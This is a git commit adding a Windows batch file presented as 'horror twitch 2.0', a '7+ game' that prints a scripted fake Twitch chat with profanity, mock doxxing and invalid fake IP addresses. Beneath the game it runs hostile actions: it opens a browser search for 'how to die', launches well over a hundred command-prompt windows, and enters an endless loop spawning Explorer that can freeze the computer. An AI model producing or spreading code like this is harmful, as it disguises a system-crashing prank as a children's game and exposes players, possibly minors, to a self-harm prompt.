4cfb81b772c7071d487b95c766b1efa4b21babd0
Nagi project <n8796085@gmail.com>
2026-04-18 14:52:04 +1100

    Add files via upload

---
+++ horror twitch.bat
@@ -0,0 +1,361 @@
+@title horror twitch 2.0
+@color 2
+@echo off
+@echo -------------------------------------------------
+@echo if anything, press any button to continue writing
+@echo             7+ game no for adults
+@echo     if the pc speeds up it's not our fault
+@echo -------------------------------------------------
+set "my_word=banana cat:hello"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=Yar_developer:O hello banana cat"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=YTleon99s:hellooooo"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=amogus:go fuck yourself leons"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=YTleon99s:on"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=Sky:hello"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=twitch:ban amogus 50d reason for swearing"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=YTleon99s:hahahahhahahahahhahahahha"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=twitch:ban YTleons 1d for this reason you can't laugh when a person is banned"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=ours: ?"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=You: what are you doing"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=You: no no no"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=error 1643"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=error 1643"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=error 1643"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=error 1643"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=error 1643"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+start https://www.google.com/search?q=how+to+die
+set "my_word=You: on on on on on"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=ours: hahahhahahahahahhahaha and you were angered"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=You: on on on on on"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=ours: yes yes yes yes yes"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=ours: look what I can do"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+start explorer.exe
+set "my_word=You: on on on on on please go away"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=ours: no"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=ours: But I can if you send me all the money"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=You: ok"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=T-bank: you transferred money 10000rub to the name of maria volka m."
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=twitch: ours left the stream"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=You: why look who is this but I know the last name and first name"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=You: and also a number hhahahahahhahahhaha"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+set "my_word=You: hhahahahahhahahhahahahhahahahhahahhahahahaha"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=You: hahhahaha I found out the number and this +8 *** *** ** **"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+set "my_word=You: hhahahahahhahahhahahahhahahahhahahhahahahaha"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+set "my_word=error dox dox"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+set "my_word=error dox dox"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+set "my_word=error dox dox"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=You: on on o* *n ** ** ** 83 ud i3"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+:x
+start explorer.exe
+goto x
+pause > nul
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+set "my_word=error dox dox"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+pause > nul
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+set "my_word=error dox dox"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=DjagerMan : suca what tut proiscotit ?
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=Banana cat : neznaq"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=Ban DjagerMan 1000 year za : hahahahhaha dox"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=Banana cat : suca za brata"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=Ban Banana cat 1000 year za : hahahhahha s*cin s*n"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=DOxer : hahahah loxi is a im ban Banana cat DjagerMan hahahahhahaha"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=;( kill is doxer banana cat djagerman ) ;"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=banana cat ip - 711.555.344.444 tam djagerman"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=doxer ip - 99923.45464.45466.344456 server"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=twitch : suca ban all "
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=error nol adminca"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+set "my_word=twitch : what ?"
+timeout /t 1 /nobreak > nul
+echo %my_word%
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+pause > nul
